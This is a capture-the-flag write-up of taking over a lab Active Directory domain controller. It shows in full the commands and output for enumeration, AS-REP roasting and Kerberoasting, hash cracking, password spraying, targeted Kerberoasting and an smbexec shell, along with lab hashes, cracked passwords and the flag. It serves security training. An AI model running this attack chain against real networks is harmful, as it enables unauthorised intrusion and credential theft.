
# CTF Writeup: Operation Endgame

---
## Reconaissance

An initial scan revealed the following running services on the target server.

```
nmap -p- 10.114.170.105                                      
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-14 12:07 -0500
Nmap scan report for 10.114.170.105
Host is up (0.016s latency).
Not shown: 65505 closed tcp ports (reset)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
7680/tcp  open  pando-pub
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49674/tcp open  unknown
49678/tcp open  unknown
49681/tcp open  unknown
49687/tcp open  unknown
49715/tcp open  unknown
49718/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 33.62 seconds
```

Another more detailled scan revealed crucial information about the running services.

```
nmap -A -p 53,80,88,135,139,389,443,445,464,593,636,3268,3269,3389,7680,9389,47001,49664,49665,49666,49667,49669,49670,49671,49674,49678,49681,49687,49715,49718 10.114.170.105 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-14 12:12 -0500
Nmap scan report for 10.114.170.105
Host is up (0.012s latency).

PORT      STATE  SERVICE           VERSION
53/tcp    open   domain            Simple DNS Plus
80/tcp    open   http              Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open   kerberos-sec      Microsoft Windows Kerberos (server time: 2026-05-14 17:12:08Z)
135/tcp   open   msrpc             Microsoft Windows RPC
139/tcp   open   netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open   ldap              Microsoft Windows Active Directory LDAP (Domain: thm.local, Site: Default-First-Site-Name)
443/tcp   open   ssl/https?
| ssl-cert: Subject: commonName=thm-LABYRINTH-CA
| Not valid before: 2023-05-12T07:26:00
|_Not valid after:  2028-05-12T07:35:59
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: 2026-05-14T17:14:23+00:00; 0s from scanner time.
445/tcp   open   microsoft-ds?
464/tcp   open   kpasswd5?
593/tcp   open   ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open   ldapssl?
3268/tcp  open   ldap              Microsoft Windows Active Directory LDAP (Domain: thm.local, Site: Default-First-Site-Name)
3269/tcp  open   globalcatLDAPssl?
3389/tcp  open   ms-wbt-server     Microsoft Terminal Services
| ssl-cert: Subject: commonName=ad.thm.local
| Not valid before: 2026-05-13T17:02:55
|_Not valid after:  2026-11-12T17:02:55
|_ssl-date: 2026-05-14T17:14:23+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: THM
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: AD
|   DNS_Domain_Name: thm.local
|   DNS_Computer_Name: ad.thm.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-05-14T17:13:16+00:00
9389/tcp  open   mc-nmf            .NET Message Framing
47001/tcp open   http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open   msrpc             Microsoft Windows RPC
49665/tcp open   msrpc             Microsoft Windows RPC
49666/tcp open   msrpc             Microsoft Windows RPC
49667/tcp open   msrpc             Microsoft Windows RPC
49669/tcp open   msrpc             Microsoft Windows RPC
49670/tcp open   ncacn_http        Microsoft Windows RPC over HTTP 1.0
49671/tcp open   msrpc             Microsoft Windows RPC
49674/tcp open   msrpc             Microsoft Windows RPC
49678/tcp open   msrpc             Microsoft Windows RPC
49681/tcp open   msrpc             Microsoft Windows RPC
49687/tcp open   msrpc             Microsoft Windows RPC
49715/tcp open   msrpc             Microsoft Windows RPC
49718/tcp open   msrpc             Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.99%E=4%D=5/14%OT=53%CT=7680%CU=38016%PV=Y%DS=3%DC=T%G=Y%TM=6A06
OS:02F6%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%
OS:TS=U)SEQ(SP=104%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=105%GCD=1%
OS:ISR=10A%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=106%GCD=1%ISR=10A%TI=I%CI=I%II=I
OS:%SS=S%TS=U)SEQ(SP=FF%GCD=1%ISR=101%TI=I%CI=I%II=I%SS=S%TS=U)OPS(O1=M4E8N
OS:W8NNS%O2=M4E8NW8NNS%O3=M4E8NW8%O4=M4E8NW8NNS%O5=M4E8NW8NNS%O6=M4E8NNS)WI
OS:N(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FF
OS:FF%O=M4E8NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF
OS:=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=
OS:%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=
OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T
OS:7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN
OS:=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 3 hops
Service Info: Host: AD; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-05-14T17:13:19
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

TRACEROUTE (using port 7680/tcp)
HOP RTT     ADDRESS
1   7.98 ms 192.168.128.1
2   ...
3   9.21 ms 10.114.170.105

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 148.63 seconds
```

Retrieved the domain "thm.local" from the scan itself and mapped the target ip to the domain name in our local dns file.

```
echo "10.114.170.105 thm.local" | tee -a /etc/hosts
```

Performed user enumeration with nxc as anonymous user.

```
nxc smb thm.local -u '' -p '' --rid-brute
```

Stored the relevant users in a "users.txt" wordlist.

Utilized the following command to format the wordlist properly and stored it in a "newusers.txt" file.

```
grep "SidTypeUser" users.txt | cut -d '\' -f2 | cut -d ' ' -f1 > newusers.txt
```

Performed ASREP-Roasting and gained multiple tgt hashes for user isiah walker, maxine freeman, phyllis mccoy, queen garner & shelley beard.

```
/usr/share/doc/python3-impacket/examples/GetNPUsers.py thm.local/ -no-pass -usersfile newusers.txt
```

Tried to bruteforce an password out of all of them. But didn't work with hashcat & john the ripper.

Performed kerberoasting with "guest" Credentials.

```
impacket-GetUserSPNs -request -dc-ip 10.114.170.105 thm.local/guest
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
ServicePrincipalName    Name      MemberOf                                            PasswordLastSet             LastLogon                   Delegation 
----------------------  --------  --------------------------------------------------  --------------------------  --------------------------  ----------
HTTP/server.secure.com  CODY_ROY  CN=Remote Desktop Users,CN=Builtin,DC=thm,DC=local  2024-05-10 09:06:07.611965  2024-04-24 10:41:18.970113             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*CODY_ROY$THM.LOCAL$thm.local/CODY_ROY*$051e30d477f1aa7eee4548c96b116e3d$84fd275842a0754e71a0ccd438bced6dfa24e8e9c822a2db41500e2434d5701c745cba83d5ba2e4ad7dc74d61b7115a688f56838361b980cd0e89478846d8a619688a5dee308ff37e975ba00a686ca012f9aa512ffbdd828004f5f4813244581354c8845d8e9981dac350dae3f560922522b7ee5af56ff3a00680a706279cd2e4aa92ec3741c82d4c59742ff95c993b6c23cd8ce26ddb882e7017cfd63a8c8570eb02cb7bacb09bcd815ed27c5d74a67ae985ab9d8cbe05f502718fa00f75b470ebcaec67b4e43e4a39302dacf058262f29dc8370b26c0e0a16d241142f5c82c3b402a50ecae24c9e7b614cf0e1122136e8ab0d9975456fdb3ebea31f7f82e2e0a7433c087d8d9064c77917923fe8274e68a14840fd6f1598ff382f278bf30f06d2b10969093ef91327d829a295753d0d61d642a0452663d9b921b4b4799f387b185dc7824872e5b26822f24bfccdbf56e7871afeb92402c468693616b6b1140d2851913372c53b1fa85672ec045e5c2ace717defc4672ee97a1c2f6ae694d154158fa58cc72c8e4dfa4568bee244de05d40df23f38fe6a467f1e3ebccf67ce9d640690a4e4ef6687daf7216942bdf9b7659d65f7340038efe3b80491ae59afdfec1b9e58c38ef3917ea7ffd3054c6bd57e1662ed9f6cbbb8c7334f29abeab19d3c633d5174248a54e6055075c35ba140d2be330d3f279e504b9587a9825c833a9f8876f9a7f92739216a48d088427f3d22db1f5e822a34f57f388d68d0ab5a17459d3843abe2e1c8169e95010ccf8b5c6781653682e178067cd441bdab09e4edec6eb0acef0f22c335c23acc27590ed7c2673f67617a223784e3cf992aaeb64d47bb64f7b63dcc9af0d708fc4df1844e14e63177d9f8f34dc499ec285840b2f356f7dfebdc407c7c8e457b6c8bfe9fb7a8c92f79f561626c7c15809bc49c8981051ca016045c17c4e6edeffb658a5ae572fa52294dabfcc501be32e6ddd82cdf8533ad75e8ca096a178a3b8eb9a37a097b2c5414039a0ded79af77a285c2a91657a28396d8f225d7c0083a899374e7fce75ecf1c855b17a0f697c20837e25f7f99ac6e8b1e8706e6a21d6932e3e7d897ad811ca81ac37ab4ce5e6f12dc3cee7de963ab089d44d2eb247217f2cf3aad6c4fb72108c8f897029dab67fcaf0007697e802490e9c686ad60f84861ed3c864c3ddc4137b1a7496acd6cbfc04665f232c147be1b4aa43a12f9893baa3c00b7e9fe12adc0708ec4d76cf718b0eac96ed5857997c8707b77c2d00923ef7a8498b2c95cdb0785c25745d39df67da8d5b3e6526f2678d19c4296b77b1828c167b174ce2a2c9b8afd829ee5a2217d582cbfa4508c16380d8946242c084ee7e5cf0278144bd2ecdee6410498918b9b01489
```

Retrieved the TGT of user "cody_roy".

Bruteforced an password out of the TGT with john the ripper.

```
john cody_roy --wordlist=/usr/share/wordlists/rockyou.txt     
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
MKO)mko0         (?)     
1g 0:00:00:01 DONE (2026-05-14 13:28) 0.8547g/s 604772p/s 604772c/s 604772C/s MOSSIMO..LEANN1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

We gained valid credentials.

```
cody_roy:MKO)mko0
```

Actually nxc spraying credentials was very tricky. Since the ) parameter wasn't interpreted as character by our zsh shell. I stored the password inside an .txt.

```
mousepad password.txt
```

I then ran nxc with an command as attribute for -p parameter which displays the password.txt file.

Verified that we can connect to the Domain Controller via RDP.

```
nxc rdp thm.local -u='cody_roy' -p $(cat password.txt)
RDP         10.114.170.105  3389   AD               [*] Windows 10 or Windows Server 2016 Build 17763 (name:AD) (domain:thm.local) (nla:True)
RDP         10.114.170.105  3389   AD               [+] thm.local\cody_roy:MKO)mko0 (Pwn3d!)
```

Connected to SMB on SYSVOL Share.

```
smbclient \\\\thm.local/SYSVOL -U cody_roy
Password for [WORKGROUP\cody_roy]:
Try "help" to get a list of possible commands.
smb: \>
```

Downloaded all contents to local machine.

```
smb: \> prompt OFF
smb: \> recurse ON
smb: \> mget *
```

I didn't retrieve anything useful and was also not able to login into the box. Therefore I utilized the domain credentials in order to download all domain information with bloodhound.

Started up bloodhound and uploaded domain information.

```
neo4j console
bloodhound
https://127.0.0.1:9090/ui
```

Found out that we can kerberoast another user.

![[Pasted image 20260514205759.png]]

Gained TGT of user "Christian_Sanford".

```
impacket-GetUserSPNs -request -dc-ip 10.114.170.105 thm.local/cody_roy
```

Stored the TGT Hash in an file on my local machine and bruteforced an password using hashcat.

```
hashcat -m 13100 christian_sanford /usr/share/wordlists/rockyou.txt
```

Unfortunately I wasn't able to crack it with john the ripper or hashcat.

Moved onto spraying all of the userlist to the password of cody_roy.

```
nxc smb thm.local -u ../users/newusers.txt -p $(cat ../password.txt) --continue-on-success
```

Gained an hit for user "ZACHARY_HUNT".

```
zachary_hunt:MKO)mko0
```

I marked him as "owned" in BloodHound & checked his Outbound Object Controls. I was able to retrieve that he has "GenericWrite" Permissions over another User named "JERRI_LANCASTER".

Added an SPN to for user "jerry_lancaster" temporarily and retrieved his TGT.

```
python3 targetedKerberoast.py -v -d 'thm.local' -u 'ZACHARY_HUNT' -p 'MKO)mko0' --dc-host ad.thm.local --request-user JERRI_LANCASTER
```

Bruteforced an password out of the TGT

```
john jerri_lancaster --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
lovinlife!       (?)     
1g 0:00:00:00 DONE (2026-05-14 14:18) 3.333g/s 2085Kp/s 2085Kc/s 2085KC/s lrcjks..love2cook
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Gained new credentials.

```
jerry_lancaster:lovinlife!
```

We are able to connect to the host as this user via RDP!

```
nxc rdp thm.local -u 'jerri_lancaster' -p 'lovinlife!'
RDP         10.114.170.105  3389   AD               [*] Windows 10 or Windows Server 2016 Build 17763 (name:AD) (domain:thm.local) (nla:True)
RDP         10.114.170.105  3389   AD               [+] thm.local\jerri_lancaster:lovinlife! (Pwn3d!)
```

Connected successfully to the target server.

```
xfreerdp3 /cert:ignore /clipboard /compression /auto-reconnect /u:jerri_lancaster /p:'lovinlife!' /d:thm.local /v:10.114.170.105 /w:1600 /h:800 /drive:test,/home/saitama/Desktop 
```

There seems to be an non-default Share named "Scripts" in the Root Directory. 

Inside of there, there is an script called "syncer.ps1". Observed it and gained credentials for user "sanford_daugherty".

![[Pasted image 20260514212508.png]]

```
sanford_daugherty:RESET_ASAP123
```

Analyzed the user in bloodhound and found out he is domain admin, we comprimised the Domain Controller! Let's connect via RDP.

```
xfreerdp3 /cert:ignore /clipboard /compression /auto-reconnect /u:sanford_daugherty /p:'RESET_ASAP123' /v:10.114.170.105 /w:1600 /h:800 /drive:test,/home/saitama/Desktop
```

This didn't work! Sprayed SMB and it's pwned aswell! But psexec & wmiexec didn't work. I tried it with smbexec.py and it worked.

```
/usr/share/doc/python3-impacket/examples/smbexec.py 'thm.local/sanford_daugherty:RESET_ASAP123@thm.local'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>
```


Retrieved flag.txt in C:\Users\Administrator\Desktop

```
C:\Windows\system32>type C:\Users\Administrator\Desktop\flag.txt.txt
THM{INFILTRATION_COMPLETE_OUR_COMMAND_OVER_NETWORK_ASSERTS}
```